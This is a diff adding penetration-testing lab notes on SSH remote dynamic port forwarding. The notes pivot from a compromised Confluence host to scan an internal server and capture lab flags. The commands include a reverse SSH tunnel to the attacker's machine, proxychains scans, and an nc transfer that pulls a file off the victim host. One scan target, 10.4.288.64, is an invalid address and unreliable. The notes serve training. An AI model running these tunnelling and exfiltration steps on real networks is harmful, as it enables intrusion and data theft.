@@ -579,9 +579,88 @@ ssh -N -R 127.0.0.1:4141:10.4.193.215:5432 kali@192.168.45.196
 	Flag: "OS{6650a40c7f5841a75a01cfce295c5915}"
 ```
 
-
-
 ## Remote Dynamic
 
+1. Follow the steps in this section to set up a remote dynamic port forward from CONFLUENCE01. Scan ports 9000-9100 on MULTISERVER03 through it. Which port is open? (Note: Make sure to scan MULTISERVER03 on its internal interface at 10.4.X.64).
 
+- Gain remote shell on CONFLUENCE01 via curl & CVE vuln exploit
+- Upgrade TTY
+- Start a dynamic remote port forward on CONFLUENCE01
+```bash
+ssh -N -R 9998 kali@192.168.45.196
+```
+
+- Edit proxychains config file and use to scan
+```bash
+# On Kali
+sudo vim /etc/proxychains4.conf
+	# Last line
+	socks5 127.0.0.1 9998
+
+proxychains nmap -vvv -sT -Pn -p 9000-9100 -n 10.4.288.64
+	...
+	PORT     STATE  SERVICE       REASON
+	9062/tcp open   unknown         syn-ack
+```
+
+
+2. **Capstone Exercise**: Download the **ssh_remote_dynamic_client** binary from the CONFLUENCE01 web server at **http://CONFLUENCE01:8090/exercises/ssh_remote_dynamic_client**. Run it against the port you just found on MULTISERVER03 through the remote dynamic port forward.
+
+Note: the source files used to build the **ssh_remote_dynamic_client** binary can be downloaded from **/exercises/client_source.zip**.
+
+- Exit out of current reverse shell on CONFLUENCE01
+- Re-setup reverse shell using curl & CVE
+- Upgrade TTY
+- Kill current SSH tunnel
+```bash
+# On CONFLUENCE01
+ps aux | grep ssh
+	root         980  0.0  0.1  12180  6792 ?        Ss   21:54   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+	conflue+    3293  0.0  0.1  12016  6092 pts/0    S+   22:04   0:00 ssh -N -R 9998 kali@192.168.45.196
+	conflue+    4188  0.0  0.0   6432   724 ?        S    22:38   0:00 grep ssh
+
+kill -9 3293
+```
+
+- Use `nc` to download **ssh_remote_dynamic_client** & test
+```bash
+# In Kali
+nc -nlvp 3333 > ssh_remote_dynamic_client
+
+# In CONFLUENCE01
+nc 192.168.45.196 3333 -q 1 < ../confluence/exercises/ssh_remote_dynamic_client
+
+# Once done, in Kali
+chmod +x ssh_remote_dynamic_client
+
+./ssh_remote_dynamic_client
+	Connecting to 127.0.0.1:4141
+	thread 'main' panicked at 'Failed to connect to 127.0.0.1:4141: Connection refused (os error 111)', src/client.rs:79:13
+	note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
+```
+
+- Setup SSH Dynamic Remote
+```bash
+# In CONFLUENCE01
+ssh -N -R 4141 kali@192.168.45.196
+```
+
+- Configure proxychains and run the ssh_client against the port
+```bash
+# In Kali
+sudo vim /etc/proxychains4.conf
+	# Last line
+	socks5 127.0.0.1 4141
+
+proxychains ./ssh_remote_dynamic_client -i 10.4.228.64 -p 9062
+	[proxychains] config file found: /etc/proxychains4.conf
+	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+	[proxychains] DLL init: proxychains-ng 4.17
+	Connecting to 10.4.228.64:9062
+	[proxychains] Strict chain  ...  127.0.0.1:4141  ...  10.4.228.64:9062  ...  OK
+	Flag: "OS{600ec97518b9df6c8b93adbe8b47b312}"
+```
+
+
+## sshuttle
 
